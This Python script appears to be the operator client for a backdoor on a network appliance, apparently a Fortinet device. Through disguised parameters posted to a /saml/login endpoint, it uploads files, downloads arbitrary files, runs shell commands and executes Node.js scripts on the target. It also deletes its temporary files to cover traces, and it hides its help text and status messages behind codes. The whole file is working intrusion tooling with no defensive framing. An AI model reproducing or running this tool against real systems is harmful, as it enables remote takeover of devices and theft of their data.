#!/usr/bin/env python

# pip install urllib3==1.25.11

import argparse
import os
import requests
import sys
import urllib.parse
import binascii
import uuid
import os

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


entry_api = "/saml/login"
tmp_apis = ["/lang/custom/sjis.json"]

str_maps = {
    "action": "abreve",
    "download": "abstract",
    "upload": "usemap",
    "shell": "float",
    "path": "super",
    "status": "prompt",
    "data": "alpha",
}

session = requests.Session()
session.headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mozilla Firefox.'
}

class SilentParser(argparse.ArgumentParser):
    def error(self, message):
        sys.exit(1)

    def print_help(self, file=None):
        pass

    def print_usage(self, file=None):
        pass

def generate_local_tmp_nodejs(nodejs_script, remove_files=[], clean_tmp=False):
    if isinstance(nodejs_script, bytes):
        nodejs_content = nodejs_script.decode("utf-8")
    else:
        nodejs_content = nodejs_script

    for item in remove_files:
        nodejs_content += ("if(fs.existsSync('%s')){fs.unlinkSync('%s');}" % (item, item))
    
    if clean_tmp:
        for tmp_api in tmp_apis:
            tmp_path = "/migadmin/%s.gz" % tmp_api
            nodejs_content += ("if(fs.existsSync('%s')){fs.unlinkSync('%s');}" % (tmp_path, tmp_path))
    
    os.makedirs("./tmp", exist_ok=True)
    local_tmp_file = "./tmp/%s" % uuid.uuid4().hex
    with open(local_tmp_file, "w") as f:
        f.write(nodejs_content)
    
    return local_tmp_file

def get_host_port_from_url(url):
    parsed = urllib.parse.urlparse(url)
    scheme = parsed.scheme
    hostname = parsed.hostname
    port = parsed.port

    if port is None:
        if scheme == 'http':
            port = 80
        elif scheme == 'https':
            port = 443

    return hostname, port


def cmd_rm(target, file_path):
    nodejs_script = "const fs = require('fs');"
    nodejs_script += "if(fs.existsSync('%s')){fs.unlinkSync('%s');}" % (file_path, file_path)
    
    remote_tmp_path = "/tmp/%s" % uuid.uuid4().hex
    local_tmp_path = generate_local_tmp_nodejs(nodejs_script, remove_files=[remote_tmp_path], clean_tmp=True)
    action_upload(target, local_tmp_path, remote_tmp_path)

    shell_cmd = "/bin/node %s" % (remote_tmp_path)
    action_shell(target, shell_cmd, get_resp=False, log=True, clean_tmp=False)

    os.remove(local_tmp_path)

def cmd_ls(target, file_path):
    local_script_path = "../nodejs_scripts/ls.js"
    if not os.path.exists(local_script_path):
        print("[-] F01000A")
        sys.exit(-1)

    remote_tmp_path = "/tmp/%s" % uuid.uuid4().hex

    action_upload(target, local_script_path, remote_tmp_path)

    shell_cmd = "/bin/node %s %s" % (remote_tmp_path, file_path)
    action_shell(target, shell_cmd, clean_tmp=False)

    delete_tmp_file(target, [remote_tmp_path])

def cmd_cp(target, src, dest):
    nodejs_script = "const fs = require('fs');"
    nodejs_script += "if(fs.existsSync('%s')){fs.copyFileSync('%s','%s');}" % (src, src, dest)
    
    remote_tmp_path = "/tmp/%s" % uuid.uuid4().hex
    local_tmp_path = generate_local_tmp_nodejs(nodejs_script, remove_files=[remote_tmp_path], clean_tmp=True)
    action_upload(target, local_tmp_path, remote_tmp_path)

    shell_cmd = "/bin/node %s" % remote_tmp_path

    action_shell(target, shell_cmd, get_resp=False, log=True, clean_tmp=False)

    os.remove(local_tmp_path)

def cmd_mv(target, src, dest):
    nodejs_script = "const fs = require('fs');"
    nodejs_script += "if(fs.existsSync('%s'))try{fs.renameSync('%s','%s')}catch(e){e.code==='EXDEV'&&(fs.copyFileSync('%s','%s'),fs.unlinkSync('%s'))}" % (src, src, dest, src, dest, src)
    
    remote_tmp_path = "/tmp/%s" % uuid.uuid4().hex
    local_tmp_path = generate_local_tmp_nodejs(nodejs_script, remove_files=[remote_tmp_path], clean_tmp=True)
    action_upload(target, local_tmp_path, remote_tmp_path)

    shell_cmd = "/bin/node %s" % remote_tmp_path

    action_shell(target, shell_cmd, get_resp=False, log=True, clean_tmp=False)

    os.remove(local_tmp_path)

custom_cmds = {
    "rm": cmd_rm,
    "ls": cmd_ls,
    "cp": cmd_cp,
    "mv": cmd_mv
}

def delete_tmp_file(target, remove_files=[]):
    nodejs_script = "const fs = require('fs');"
    for tmp_item in remove_files:
        nodejs_script += ("if(fs.existsSync('%s')){fs.unlinkSync('%s');}" % (tmp_item, tmp_item))

    for tmp_api in tmp_apis:
        tmp_path = "/migadmin/%s.gz" % tmp_api
        nodejs_script += ("if(fs.existsSync('%s')){fs.unlinkSync('%s');}" % (tmp_path, tmp_path))
    
    remote_tmp_path = "/tmp/%s" % uuid.uuid4().hex
    local_tmp_path = generate_local_tmp_nodejs(nodejs_script, remove_files=[remote_tmp_path])
    action_upload(target, local_tmp_path, remote_tmp_path, log=False)

    shell_cmd = "/bin/node %s" % (remote_tmp_path)
    action_shell(target, shell_cmd, get_resp=False, log=False)

    os.remove(local_tmp_path)


def action_download(target, file_path):
    print("[*] F01000B: %s ..." % file_path)
    req_url = urllib.parse.urljoin(target, entry_api)
    file_name = os.path.basename(file_path)

    if "+" in file_path:
        file_path = urllib.parse.quote(file_path)

    post_data = "%s=%s&%s=%s" % (str_maps["action"], str_maps["download"], str_maps["path"], file_path)
    try:
        session.post(req_url, post_data, verify=False)
    except requests.exceptions.RequestException as e:
        pass

    for tmp_api in tmp_apis:
        req_url = urllib.parse.urljoin(target, tmp_api)
        dir_path = os.path.join("./files", "%s_%d" % get_host_port_from_url(target))
        resp = session.get(req_url, verify=False, stream=True)
        if resp.status_code == 200:
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)

            local_file_path = os.path.join(dir_path, file_name)
            print("[+] F01000C: %s" % local_file_path)
            with open(local_file_path, "wb") as f:
                f.write(resp.raw.read())

            delete_tmp_file(target)
            return

    print("[-] F01000D")


def action_upload(target, local_file_path, remote_file_path, offset=0, log=True):
    if log:
        print("[*] F01000E: %s -> %s ..." % (local_file_path, remote_file_path))

    req_url = urllib.parse.urljoin(target, entry_api)

    with open(local_file_path, "rb") as f:
        raw_content = f.read()
    
    content_len = len(raw_content)
    for i in range(0, content_len, 0x8000):
        status = 0 if i == 0x0 else 1
        if i< offset:
            continue

        hex_data = binascii.hexlify(raw_content[i:i+0x8000])
        hex_data = hex_data.decode("utf-8")
        post_data = "%s=%s&%s=%s&%s=%d&%s=%s" % (str_maps["action"], str_maps["upload"], str_maps["path"], remote_file_path, str_maps["status"], status, str_maps["data"], hex_data)

        try:
            session.post(req_url, data=post_data, verify=False)
        except requests.exceptions.RequestException as e:
            pass
    
    if log:
        print("[+] F01000F")

def action_shell(target, shell_cmd, get_resp=True, log=True, print_resp=True, clean_tmp=True):
    if isinstance(shell_cmd, bytes):
        shell_cmd = shell_cmd.decode("utf-8")

    if log:
        print("[*] F010010: %s ..." % shell_cmd)

    req_url = urllib.parse.urljoin(target, entry_api)

    shell_cmd_encoded = urllib.parse.quote(shell_cmd)
    post_data = "%s=%s&%s=%s" % (str_maps["action"], str_maps["shell"], str_maps["path"], shell_cmd_encoded)

    try:
        session.post(req_url, data=post_data, verify=False)
    except requests.exceptions.RequestException as e:
        pass

    if not get_resp:
        if log:
            print("[+] F010011")
        return ""

    for tmp_api in tmp_apis:
        req_url = urllib.parse.urljoin(target, tmp_api)
        resp = session.get(req_url, verify=False, stream=True)
        if resp.status_code == 200:
            print("[+] F010012")
            data = resp.raw.read().decode("utf-8")
            if print_resp:
                print("[*] F010013:")
                print(data)
            
            if clean_tmp:
                delete_tmp_file(target)
            return data
        
    print("[!] F010014")
    return ""

def action_nodejs(target, local_file_path):
    remote_tmp_path = "/tmp/%s" % uuid.uuid4().hex
    action_upload(target, local_file_path, remote_tmp_path)
    shell_cmd = "/bin/node %s" % (remote_tmp_path)

    action_shell(target, shell_cmd, clean_tmp=False)

    delete_tmp_file(target, [remote_tmp_path])

def main():
    parser = SilentParser(add_help=False)
    parser.add_argument("-t", "--target", help="")
    parser.add_argument("--action", help="")
    parser.add_argument("--rfile", help="")
    parser.add_argument("--lfile", help="")

    group = parser.add_mutually_exclusive_group()
    group.add_argument("--cmd", type=str, help="")
    group.add_argument("--custom_cmd", type=str, help="")

    args = parser.parse_args()
    if args.target is None or args.action is None:
        print("[-] F010001")
        sys.exit(-1)

    if args.action == "upload":
        if args.lfile is None or args.rfile is None:
            print("[-] F010002")
            sys.exit(-1)
        
        if not os.path.exists(args.lfile):
            print("[-] F010003")
            sys.exit(-1)
        
        action_upload(args.target, args.lfile, args.rfile)
    elif args.action == "download":
        if args.rfile is None:
            print("[-] F010004")
            sys.exit(-1)
        
        action_download(args.target, args.rfile)
    elif args.action == "shell":
        if args.cmd:
            action_shell(args.target, args.cmd)
        elif args.custom_cmd:
            tmp_items = args.custom_cmd.split(" ")
            arg_cmd = tmp_items[0]
            if arg_cmd not in custom_cmds:
                print("[-] F010005")
                parser.print_help()
                sys.exit(-1)
            
            if arg_cmd in ["cp", "mv"]:
                custom_cmds.get(arg_cmd)(args.target, tmp_items[1], tmp_items[2])
            else:
                custom_cmds.get(arg_cmd)(args.target, tmp_items[1])
        else:
            print("[-] F010006")
            sys.exit(-1)
    elif args.action == "nodejs":
        if args.lfile is None:
            print("[-] F010007")
            sys.exit(-1)
        
        if not os.path.exists(args.lfile):
            print("[-] F010008")
            sys.exit(-1)

        action_nodejs(args.target, args.lfile)
    else:
        print("[-] F010009")
        sys.exit(-1)

if __name__ == "__main__":
    main()
